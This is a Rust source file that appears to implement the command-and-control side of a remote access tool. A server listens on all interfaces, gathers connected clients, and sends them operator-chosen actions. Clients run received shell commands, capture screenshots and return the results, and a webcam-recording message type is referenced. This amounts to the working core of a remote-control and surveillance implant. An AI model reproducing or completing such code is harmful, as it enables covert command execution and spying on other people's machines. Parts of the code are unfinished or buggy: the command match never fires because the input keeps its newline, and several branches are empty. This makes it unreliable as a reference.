use std::{io::{stdin, stdout, Error, Read, Write}, net::{Shutdown, TcpListener, TcpStream}, sync::{atomic::{AtomicBool, Ordering}, Arc, Mutex}, thread};

use log::{error, info};

use crate::connection::{message_serialization::{parse_message, save_screenshot, turn_to_bytes}, messages::{GetScreenshotRequest, RecordWebcamRequest, RunCommandRequest}};

use super::{actions::{run_command_message, run_screenshot}, message_serialization::get_message_to_buffer_big_endian, messages::{Message, MESSAGE_HEADER_LENGTH}};

pub const BIND_ANY: &str = "0.0.0.0";
const COLOR_START: &str = "\x1B[38;2"; // Color Start
const COLOR_END: &str = "\x1b[0m"; // To flush out prev settings

// response: meaning what happened as a result of running the action
fn send_response(response: Message, mut stream: &TcpStream) -> Result<(), Error> {
    let response_buffer = turn_to_bytes(response)?;
    // info!("sending response buffer {:?}", &response_buffer);

    // write to the tcp network and fetch from server or client :3
    stream.write_all(&response_buffer)?;
    stream.flush().expect("could not flush");

    Ok(())
}

// handle what actions to do from message received
fn handle_message(message: Message, stream: &TcpStream) {
    match message {
        Message::RunCommandRequest(rcr) => {
            let response = run_command_message(rcr);
            let response = Message::RunCommandResponse { 0: response };
            send_response(response, stream).unwrap();
        },
        Message::GetScreenshotRequest(_) => {
            let response = run_screenshot();
            let response = Message::GetScreenshotResponse(response);
            send_response(response, stream).unwrap();
        }
        _ => ()
}
}

// make stream be a mutable variable reference, and not the value itself
fn get_message(mut stream: &TcpStream) -> Result<Message, Error> {
    
    let mut temporary_buffer = [0_u8; MESSAGE_HEADER_LENGTH];

    // block the thread until stream has been received to read and is what causes command input to
    // be waited when received on STREAM BUFFER
    match stream.read_exact(&mut temporary_buffer) {
        Ok(()) => {
            // parse to big endian and generate buffer size
            // get the number of buffer u8 bytes based on the buffer length
            let message_length = get_message_to_buffer_big_endian(temporary_buffer);

            // has to be vector macro to use usize
            let mut message_buffer = vec![0; message_length];

            if let Err(e) = stream.read_exact(&mut message_buffer) {
                error!("failed to read message >:c");
                stream.shutdown(Shutdown::Both)?;
                return Err(e);
            }
            let message: Message = ron::de::from_bytes(&message_buffer).unwrap();
            Ok(message)
        },
        Err(e) => {
            if e.kind() != std::io::ErrorKind::WouldBlock {
                stream.shutdown(Shutdown::Both)?;
            }
            error!("error, terminating connection! >:c");
            return Err(e);
        }
    }
}

pub fn client_handle_stream(stream: &TcpStream) -> Result<(), Error> {
    info!("handling_connections from uwu {}", stream.peer_addr()?);

    // attempt to read the buffer when received
    match get_message(&stream) {
        Ok(message) => {
            info!("message recieved");
            handle_message(message, &stream);
        },
        Err(e) => {
            error!("error occured: {}", e); // will happen in case stream buffer was not able to be
            // read
            return Err(e);
        }
    }

    Ok(())
}

// helper method to return a color text
// @param color list containing RGB 
// @param text text we want to wrap in colors and live as long as the function
pub fn color_text<'a>(color: [u8; 3], text: &'a str) -> String {
    format!("{};{};{};{}m{}{}",COLOR_START, color[0], color[1], color[2], text, COLOR_END)
}

pub fn get_input_helper() -> String {
    let mut s = String::new();
    println!("[ {} ]", color_text([249, 112, 123], "what action? [screen_record] [command] [list_devices] [cancel]"));
    stdout().flush().unwrap();
    stdin().read_line(&mut s).expect("Did not enter a correct string");
    s
}

pub fn create_server(port: u16) -> Result<(), Error> {
    let create_listener = TcpListener::bind(format!("{}:{}", BIND_ANY, port))?;
    info!("listening on: {}", create_listener.local_addr()?);

    let clients: Arc<Mutex<Vec<Arc<Mutex<TcpStream>>>>> = Arc::new(Mutex::new(Vec::new()));
    let running = Arc::new(AtomicBool::new(true));

    let handle_clients_from_input = Arc::clone(&clients);
    let running_handle = Arc::clone(&running);

    let _handle_input_thread = thread::spawn(move || {

        // keeping track with the main thread run with it in case any issues arise
        while running_handle.load(Ordering::SeqCst) {
            let command = get_input_helper();

            // handle cloning the vector of multi-threaded tcp streams
            let streams = {
                let lock = handle_clients_from_input.lock().unwrap();
                lock.clone()
            };


            // handle each stream
            for stream in streams {
                // turn command to byte readable format
                let mut command_to_run: Vec<u8> =   {
                    let message = RunCommandRequest {
                            command: command.clone(),
                            async_run: false,
                        };
                        turn_to_bytes(Message::RunCommandRequest { 0: message }).unwrap()
                };
                match command.as_str() {
                    "command" => {
                        let message = RunCommandRequest {
                            command: command.clone(),
                            async_run: false,
                        };
                        command_to_run = turn_to_bytes(Message::RunCommandRequest { 0: message }).unwrap();
                    },
                    "screen_record" => {

                    },
                    "list_devices" => {

                    }
                    _ => ()
                }

                // write to stream buffer of client
                let mut stream = stream.lock().unwrap();
                if let Err(e) = stream.write(&command_to_run) {
                    error!("error writing command to stream: {}", e);
                }
                stream.flush().expect("could not flush");

                info!("finished writing on server");
                let mut temporary_buffer = [0_u8; MESSAGE_HEADER_LENGTH];

                match stream.read_exact(&mut temporary_buffer) {
                    Ok(()) => {
                        let message_length = get_message_to_buffer_big_endian(temporary_buffer);

                        // has to be vector macro to use usize
                        let mut message_buffer = vec![0; message_length];

                        if let Err(e) = stream.read_exact(&mut message_buffer) {
                            error!("failed to read message >:c {}", e);
                            stream.shutdown(Shutdown::Both).expect("could not shut down stream");
                        }
                        info!("finished reading to buffer");
                        let message: Message = ron::de::from_bytes(&message_buffer).expect("error with getting client response");

                        match message {
                            Message::RunCommandResponse(res) => {
                                info!("output received: {:?}", parse_message(&res.output));
                            },
                            Message::GetScreenshotResponse(res) => {
                                for frame in res.screenshots.iter() {
                                    save_screenshot(&frame.buffer, frame.height, frame.width, &stream.peer_addr().unwrap());
                                }
                            },
                            
                            _ => error!("unknown")
                        }
                        
                    },
                    Err(e) => error!("{}", e)
                };

            }

        }
    });

    for client_stream in create_listener.incoming() {
        match client_stream {
            Ok(stream) => {
                info!("New connection: {}", stream.peer_addr()?);
                let stream = Arc::new(Mutex::new(stream));
                let mut clients_lock = clients.lock().unwrap();

                // cleanup any streams that are dead
                clients_lock.retain(|s| s.lock().unwrap().peer_addr().is_ok());
                clients_lock.push(stream);
            }
            Err(e) => error!("Connection error: {}", e),
        }
    }

    // main thread died
    running.store(false, Ordering::SeqCst);
    _handle_input_thread.join().unwrap();
    Ok(())
}
